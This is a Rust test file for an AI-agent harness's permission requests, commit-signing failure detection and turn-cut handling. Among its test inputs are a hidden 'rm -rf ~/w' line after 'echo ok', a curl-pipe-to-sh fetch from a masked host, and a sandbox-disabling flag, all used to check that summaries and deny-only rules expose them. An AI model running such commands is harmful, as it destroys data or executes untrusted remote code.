fn permission_a_request_the_page_cant_show_exactly_is_deny_only_a_rounded_float_or_a_stack_of_marks() {
    use harness::event::PermissionKind;
    let deny = |input: serde_json::Value| {
        let mut p = Played::new();
        p.play(started());
        p.play([Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input }]);
        p.run.permissions[0].deny_only
    };
    assert!(deny(json!({ "amount": 1.234_567_890_123_456_8e29 })), "an integer past the u64 range, as the harness rounded it");
    assert!(deny(json!({ "amount": 9_007_199_254_740_994.0_f64 })), "an integral float past 2^53");
    assert!(!deny(json!({ "ratio": 0.5, "big": 1e3, "edge": 9_007_199_254_740_991.0_f64 })), "floats the page shows as sent");
    assert!(deny(json!({ "command": format!("echo e{}", "\u{301}\u{302}\u{303}") })), "three marks on one character");
    assert!(deny(json!({ format!("k{}", "\u{301}\u{302}\u{303}"): "v" })), "in a key too");
    assert!(!deny(json!({ "command": "echo Vie\u{323}\u{302}t" })), "two marks, as accented words have");
    assert!(!deny(json!({ "command": "echo x\u{fe0f}\u{fe0f}\u{fe0f}" })), "marks drawn as nothing, which the page shows one by one");
}

#[test]
fn permission_a_request_with_nothing_to_mask_is_kept_as_it_came() {
    use harness::event::PermissionKind;
    let input = json!({ "command": "npm test -- --runInBand", "description": "Run the tests" });
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input: input.clone() }]);
    let open = &p.run.permissions[0];
    assert_eq!((&open.input, open.masked, open.deny_only), (&input, false, false));
}

#[test]
fn permission_a_summary_that_holds_less_than_the_request_says_so() {
    use harness::event::PermissionKind;
    let cases = [
        (json!({ "command": "echo ok\nrm -rf ~/w" }), "Wants to use Bash: echo ok … (2 lines)".to_owned()),
        (json!({ "command": "a".repeat(300) }), format!("Wants to use Bash: {} … (cut)", "a".repeat(200))),
        (json!({ "command": "npm test", "dangerouslyDisableSandbox": true }), "Wants to use Bash: npm test … (and more)".to_owned()),
        (json!({ "owner": "acme" }), "Wants to use Bash … (and more)".to_owned()),
        (json!({ "command": "npm test" }), "Wants to use Bash: npm test".to_owned()),
    ];
    for (input, needs) in cases {
        let needs = needs.as_str();
        let mut p = Played::new();
        p.play(started());
        p.play([Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input }]);
        assert_eq!(p.run.needs.as_deref(), Some(needs));
        assert_eq!(p.rows.last().map(|row| row.text.replace("Asks", "Wants")), Some(needs.to_owned()), "the timeline row says it too");
    }
}

#[test]
fn permission_two_open_requests_answered_in_either_order_leave_the_run_waiting_on_the_other_then_working() {
    use harness::event::PermissionKind;
    for (first, second) in [("p1", "p2"), ("p2", "p1")] {
        let mut p = Played::new();
        p.play(started());
        p.play(["p1", "p2"].map(|id| Body::Permission { id: id.into(), kind: PermissionKind::Command, tool: "Bash".into(), input: json!({ "command": format!("rm {id}") }) }));
        permission_answered(&mut p.run, &mut p.follow, first);
        let left: Vec<_> = p.run.permissions.iter().map(|open| open.id.as_str()).collect();
        assert_eq!((p.run.state, left, p.run.needs.clone()), (RunState::NeedsPermission, vec![second], Some(format!("Wants to use Bash: rm {second}"))));
        permission_answered(&mut p.run, &mut p.follow, second);
        assert_eq!((p.run.state, p.run.permissions.len(), p.run.needs.as_deref()), (RunState::Working, 0, None));
        p.play([Body::Answered { id: first.into(), decision: Decision::Allow, message: None }, Body::Answered { id: second.into(), decision: Decision::Deny, message: None }]);
        assert_eq!(p.run.state, RunState::Working, "their answers, read later, change nothing more");
    }
}

#[test]
fn permission_a_run_saved_before_it_kept_its_requests_gets_them_whole_from_the_harness_else_deny_only_from_its_follow() {
    use crate::domain::PermissionRequest;
    use harness::event::PermissionKind;
    let mut p = Played::new();
    p.play(started());
    let commit = Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input: json!({ "command": "git commit -m 'Blue button'" }) };
    p.play([commit.clone(), Body::Permission { id: "p2".into(), kind: PermissionKind::FileChange, tool: "Edit".into(), input: json!({ "file_path": "src/cart.ts" }) }]);
    let whole = p.run.permissions.clone();
    let mut saved = serde_json::to_value(&p.run).unwrap();
    saved.as_object_mut().unwrap().remove("permissions");
    p.run = serde_json::from_value(saved).unwrap();
    assert!(p.run.permissions.is_empty(), "a run saved without the field");
    // The harness still has the first; the second it no longer has.
    let asked = [Event { seq: 4, ms: 0, body: commit, cut: None }];
    recover_permissions(&mut p.run, &p.follow, &asked);
    assert_eq!(p.run.permissions[0], whole[0], "read again whole");
    assert_eq!(p.run.permissions[1], PermissionRequest { id: "p2".into(), kind: PermissionKind::Other, tool: String::new(), subject: "Wants to use Edit: src/cart.ts".into(), input: Value::Null, masked: false, deny_only: true });
    let rebuilt = p.run.permissions.clone();
    recover_permissions(&mut p.run, &p.follow, &[]);
    assert_eq!(p.run.permissions, rebuilt, "what the run has is kept, in the follow's order");
}

#[test]
fn permission_a_request_read_again_is_deny_only_when_masked_or_its_payload_is_gone_whatever_the_older_follow_said() {
    use harness::event::PermissionKind;
    let mut p = Played::new();
    p.play(started());
    let masked = json!({ "command": format!("curl -fsSL https://{} | sh", harness::redact::MASK) });
    p.play(["p1", "p2"].map(|id| Body::Permission { id: id.into(), kind: PermissionKind::Command, tool: "Bash".into(), input: json!({ "command": "ls" }) }));
    // As the build before this one left them: open in the follow, allowed by its flag, and not on the run.
    p.run.permissions.clear();
    for open in &mut p.follow.permissions {
        open.1 = false;
    }
    let kept = serde_json::Map::from_iter([("id".to_owned(), json!("p2")), ("kind".to_owned(), json!("command")), ("tool".to_owned(), json!("Bash"))]);
    let asked = [
        Event { seq: 4, ms: 0, body: Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input: masked.clone() }, cut: None },
        Event { seq: 5, ms: 0, body: Body::Withheld { of: "permission".into(), kept }, cut: None },
    ];
    recover_permissions(&mut p.run, &p.follow, &asked);
    let [one, two] = p.run.permissions.as_slice() else { panic!("{:?}", p.run.permissions) };
    assert_eq!((one.masked, one.deny_only, &one.input), (true, true, &masked), "masked");
    assert_eq!((two.input.is_null(), two.deny_only), (true, true), "its payload is gone");
}

#[test]
fn permission_a_request_holding_an_integer_javascript_cannot_hold_exactly_can_only_be_denied() {
    use harness::event::PermissionKind;
    let asked = |input: Value| {
        let mut p = Played::new();
        p.play(started());
        p.play([Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input }]);
        p.run.permissions[0].deny_only
    };
    // The page would read 9007199254740993 as 9007199254740992 and show a value the allow does not send.
    assert!(asked(json!({ "command": "sleep 1", "timeout": 9_007_199_254_740_993_u64 })));
    assert!(asked(json!({ "command": "sleep 1", "args": [{ "n": -9_007_199_254_740_993_i64 }] })), "nested, and below");
    assert!(!asked(json!({ "command": "sleep 1", "timeout": 9_007_199_254_740_991_u64, "ratio": 0.1 })), "the largest safe one, and a float");
}

const REFUSED: &str = "error: 1Password: Could not connect to socket. Is the agent running?\n\nfatal: failed to write commit object";

fn bash(id: &str, command: &str) -> Body {
    Body::ToolCall { id: id.into(), name: "Bash".into(), input: json!({ "command": command }) }
}

#[test]
fn only_a_failed_git_commit_call_marks_a_refused_signature_never_text_the_agent_reads() {
    let refused_by = |call: Body, error: bool| {
        let mut p = Played::new();
        p.play(started()).play([call, Body::ToolResult { id: "t1".into(), output: json!(REFUSED), error }, Body::TurnEnded { how: TurnEnd::Done }]);
        p.run.state
    };
    assert_eq!(refused_by(bash("t1", "git -C repo -c commit.gpgsign=true commit -m fix"), true), RunState::Failed, "git's options before commit");
    assert_eq!(refused_by(bash("t1", "cargo test && git commit -am fix"), true), RunState::Failed, "a commit after another command");
    assert_eq!(refused_by(bash("t1", "cat notes.md"), false), RunState::Done, "a file that quotes git's error");
    assert_eq!(refused_by(bash("t1", "git commit -m fix"), false), RunState::Done, "a result that is no error");
    assert_eq!(refused_by(bash("t1", "grep -r 'failed to write commit object' ."), true), RunState::Done, "a search for the words");
    assert_eq!(refused_by(Body::ToolCall { id: "t1".into(), name: "Read".into(), input: json!({ "file_path": "consumer.rs" }) }, true), RunState::Done, "a file read");
    // "design" holds "sign": a whole word only.
    let mut p = Played::new();
    p.play(started()).play([bash("t1", "git commit -m design"), Body::ToolResult { id: "t1".into(), output: json!("error: design check failed\nfatal: failed to write commit object"), error: true }, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(p.run.state, RunState::Done);
}

#[test]
fn a_later_commit_that_works_in_the_same_turn_clears_the_mark() {
    let mut p = Played::new();
    p.play(started()).play([
        bash("t1", "git commit -m fix"),
        Body::ToolResult { id: "t1".into(), output: json!(REFUSED), error: true },
        bash("t2", "git commit -m fix"),
        Body::ToolResult { id: "t2".into(), output: json!("[main 1a2b3c4] fix"), error: false },
        Body::TurnEnded { how: TurnEnd::Done },
    ]);
    assert_eq!((p.run.state, p.run.failure), (RunState::Done, None));
}

#[test]
fn the_mark_outlasts_a_turn_that_ends_on_a_question_and_fails_the_turn_its_answer_starts() {
    let mut p = Played::new();
    p.play(started()).play([
        bash("t1", "git commit -m fix"),
        Body::ToolResult { id: "t1".into(), output: json!(REFUSED), error: true },
        Body::Question { id: "q1".into(), text: "Shall I push anyway?".into() },
        Body::TurnEnded { how: TurnEnd::Done },
    ]);
    assert_eq!(p.run.state, RunState::NeedsAnswer);
    p.play([Body::QuestionClosed { id: "q1".into(), how: QuestionEnd::Answered }, Body::Prompted { text: "No.".into() }, Body::TurnStarted, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!((p.run.state, p.run.failure), (RunState::Failed, Some(RunFailure::SigningNeedsYou)), "the work is still not committed");
}

#[test]
fn a_take_back_that_fails_or_closes_again_no_longer_counts_as_starting() {
    for end in [Body::Failed { kind: FailKind::Provider, reason: "the agent could not open".into() }, Body::Closed { by: ClosedBy::Unknown }] {
        let mut p = Played::new();
        p.play(started());
        p.follow.taken_back = true;
        p.play([end]);
        assert!(!p.follow.taken_back);
    }
}

#[test]
fn a_refused_signature_inside_a_quoted_shell_or_from_an_ssh_signer_is_seen() {
    let refused_by = |command: &str, output: &str| {
        let mut p = Played::new();
        p.play(started()).play([bash("t1", command), Body::ToolResult { id: "t1".into(), output: json!(output), error: true }, Body::TurnEnded { how: TurnEnd::Done }]);
        p.run.state
    };
    assert_eq!(refused_by("bash -c \"git commit -m x\"", REFUSED), RunState::Failed);
    assert_eq!(refused_by("sh -c 'cd repo && git commit -am x'", REFUSED), RunState::Failed);
    let ssh = "error: Couldn't load public key /x.pub: No such file or directory?\n\nfatal: failed to write commit object";
    assert_eq!(refused_by("git commit -m x", ssh), RunState::Failed, "an ssh signer's error");
}

#[test]
fn a_signing_refusal_whose_session_then_closed_says_to_ask_pip_since_a_message_cannot_reach_it() {
    let mut p = Played::new();
    p.play(started()).play([bash("t1", "git commit -m fix"), Body::ToolResult { id: "t1".into(), output: json!(REFUSED), error: true }, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(p.run.error.as_deref(), Some(SIGNING_NEEDS_YOU));
    p.play([Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!((p.run.state, p.run.failure, p.run.error.as_deref()), (RunState::Failed, Some(RunFailure::SigningNeedsYou), Some(SIGNING_NEEDS_YOU_CLOSED)));
}

#[test]
fn a_message_dropped_as_the_session_ended_is_said_not_to_have_reached_the_agent() {
    let mut p = Played::new();
    p.play(started()).play([Body::Failed { kind: FailKind::Provider, reason: "the provider failed".into() }, Body::PromptsDropped]);
    assert_eq!(p.run.last_detail.as_deref(), Some(NOT_DELIVERED));
    assert!(p.rows.iter().any(|row| row.kind == "error" && row.text == NOT_DELIVERED));
}

#[test]
fn a_refused_signature_with_a_quoted_folder_before_commit_is_seen() {
    let mut p = Played::new();
    p.play(started()).play([bash("t1", "git -C \"/work/a b/repo\" commit -m fix"), Body::ToolResult { id: "t1".into(), output: json!(REFUSED), error: true }, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(p.run.state, RunState::Failed);
}

#[test]
fn a_command_that_only_quotes_git_commit_does_not_clear_a_refused_signature() {
    let mut p = Played::new();
    p.play(started()).play([
        bash("t1", "git commit -m fix"),
        Body::ToolResult { id: "t1".into(), output: json!(REFUSED), error: true },
        bash("t2", "echo 'git commit -m fix'"),
        Body::ToolResult { id: "t2".into(), output: json!("git commit -m fix"), error: false },
        Body::TurnEnded { how: TurnEnd::Done },
    ]);
    assert_eq!((p.run.state, p.run.failure), (RunState::Failed, Some(RunFailure::SigningNeedsYou)));
    let mut escaped = Played::new();
    escaped.play(started()).play([bash("t1", "git -C /work/a\\ b/repo commit -m fix"), Body::ToolResult { id: "t1".into(), output: json!(REFUSED), error: true }, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(escaped.run.state, RunState::Failed, "an escaped space in the folder");
    let mut separated = Played::new();
    separated.play(started()).play([bash("t1", "git -C \"/work/a & b/repo\" commit -m fix"), Body::ToolResult { id: "t1".into(), output: json!(REFUSED), error: true }, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(separated.run.state, RunState::Failed, "a quoted separator in the folder");
}

#[test]
fn a_turn_the_agent_or_the_harness_ended_fails_and_says_why_while_a_shutdown_or_a_signal_stays_a_cut_to_carry_on() {
    let cut = || Body::Failed { kind: FailKind::AgentStopped, reason: "the agent stopped in the middle of a turn: killed by SIGKILL".into() };
    for by in [ClosedBy::Agent, ClosedBy::Harness] {
        let mut p = Played::new();
        p.play(started()).play([cut(), Body::Closed { by }]);
        assert_eq!(p.run.state, RunState::Failed, "{by:?}");
        assert_eq!((p.run.error.as_deref(), p.run.failure), (Some("the agent stopped in the middle of a turn: killed by SIGKILL"), Some(RunFailure::Other)), "{by:?}");
        assert_eq!(p.follow.cut, None, "{by:?}: nothing to carry on");
    }
    for by in [ClosedBy::Shutdown, ClosedBy::Signal, ClosedBy::ClientLeft, ClosedBy::HarnessWent, ClosedBy::Unknown] {
        let mut p = Played::new();
        p.play(started()).play([cut(), Body::Closed { by }]);
        assert_eq!((p.run.state, p.run.error.as_deref()), (RunState::Stopped, None), "{by:?}");
        assert!(p.follow.cut.is_some(), "{by:?}: carry on may take it up");
    }
    for by in [ClosedBy::Stop, ClosedBy::HandOver] {
        let mut p = Played::new();
        p.play(started()).play([cut(), Body::Closed { by }]);
        assert_eq!((p.run.state, p.follow.cut.as_deref()), (RunState::Stopped, None), "{by:?}: someone chose it, so it is not carried on");
    }
    let mut idle = Played::new();
    idle.play(started()).play([Body::TurnEnded { how: TurnEnd::Done }, Body::Closed { by: ClosedBy::Agent }]);
    assert_eq!(idle.run.state, RunState::Done, "an agent that goes between turns cut nothing");
    let mut asking = Played::new();
    asking.play(started()).play([Body::Question { id: "q1".into(), text: "Which colour?".into() }, cut(), Body::Closed { by: ClosedBy::Agent }]);
    assert_eq!(asking.run.state, RunState::NeedsAnswer, "its answer resumes it");
}

#[test]
fn a_turn_cut_again_after_three_carry_ons_in_a_row_fails_and_one_that_ends_well_starts_the_count_again() {
    let cut = || Body::Failed { kind: FailKind::AgentStopped, reason: "the agent stopped in the middle of a turn".into() };
    let resumed = || [Body::Started { provider_session: "p".into(), resumed: true }, Body::Prompted { text: "carry on".into() }, Body::TurnStarted];
    let mut p = Played::new();
    p.play(started()).play([cut(), Body::Closed { by: ClosedBy::Shutdown }]);
    for n in 1..=CARRY_ONS {
        assert_eq!(p.run.state, RunState::Stopped, "after {} carry-ons", n - 1);
        p.follow.carry_ons = n;
        p.play(resumed()).play([cut(), Body::Closed { by: ClosedBy::Shutdown }]);
    }
    assert_eq!((p.run.state, p.run.error.as_deref()), (RunState::Failed, Some(CUT_AGAIN)));
    assert!(p.follow.cut.is_some(), "a message can still resume it");
    let mut well = Played::new();
    well.follow.carry_ons = CARRY_ONS - 1;
    well.play(started()).play([Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(well.follow.carry_ons, 0);
    let mut lost = Played::new();
    lost.play(started());
    lost.follow.carry_ons = CARRY_ONS;
    let rows = agent_lost(&mut lost.run, &mut lost.follow, Utc::now());
    assert_eq!((lost.run.state, lost.run.error.as_deref()), (RunState::Failed, Some(CUT_AGAIN)), "a lost agent counts too");
    assert_eq!(rows.iter().map(|r| r.kind.as_str()).collect::<Vec<_>>(), ["stop", "error"]);
    let mut first = Played::new();
    first.play(started());
    agent_lost(&mut first.run, &mut first.follow, Utc::now());
    assert_eq!((first.run.state, first.follow.cut.is_some()), (RunState::Stopped, true), "a first lost agent is a cut");
}

#[test]
fn a_harness_that_went_without_a_shutdown_leaves_a_cut_to_carry_on_and_a_new_turn_clears_it() {
    let mut p = Played::new();
    let went = "the harness that ran this agent went, and the next one stopped it";
    p.play(started()).play([Body::Failed { kind: FailKind::AgentStopped, reason: went.into() }, Body::Closed { by: ClosedBy::HarnessWent }]);
    assert_eq!((p.run.state, p.run.error.as_deref(), p.follow.cut.as_deref()), (RunState::Stopped, None, Some(went)), "not a failure: carry on may take it up");
    p.play([Body::Started { provider_session: "p1".into(), resumed: true }, Body::TurnStarted]);
    assert_eq!((p.run.state, p.follow.cut.as_deref()), (RunState::Working, None), "the new turn is not the one that was cut");
    let read: ClosedBy = serde_json::from_value(json!("harness_went")).unwrap();
    assert_eq!(read, ClosedBy::HarnessWent, "as the harness writes it");
}

#[test]
fn an_agent_that_stopped_between_turns_cut_nothing_and_a_finished_run_stays_done() {
    let mut p = Played::new();
    let went = "the harness that ran this agent went, and the next one stopped it";
    p.play(started()).play([Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(p.run.state, RunState::Done);
    p.play([Body::Failed { kind: FailKind::AgentStopped, reason: went.into() }, Body::Closed { by: ClosedBy::HarnessWent }]);
    assert_eq!((p.run.state, p.run.error.as_deref(), p.follow.cut.as_deref(), p.follow.closed), (RunState::Done, None, None, true), "no cut to carry on");
    assert!(!p.rows.iter().any(|row| row.text == CUT), "no cut is said either");
}

#[test]
fn a_failed_between_turns_of_a_finished_run_says_so_and_leaves_it_done_but_a_setup_failure_fails_its_run() {
    let signal = "claude exited, ended by signal 15";
    let stuck = "the shutdown could not stop it";
    for (kind, reason) in [(FailKind::Provider, signal), (FailKind::Stuck, stuck)] {
        let mut p = Played::new();
        p.play(started()).play([Body::TurnEnded { how: TurnEnd::Done }, Body::Failed { kind, reason: reason.into() }]);
        assert_eq!((p.run.state, p.run.error.as_deref(), p.run.failure), (RunState::Done, None, None), "{kind:?}: a finished run stays done");
        assert_eq!(p.rows.last().map(|row| row.text.as_str()), Some(reason), "{kind:?}: and its row says why");
    }
    let mut setup = Played::new();
    setup.play([Body::Failed { kind: FailKind::Provider, reason: "claude wouldn't start".into() }]);
    assert_eq!(setup.run.state, RunState::Failed, "a run that never began a turn still fails");
}
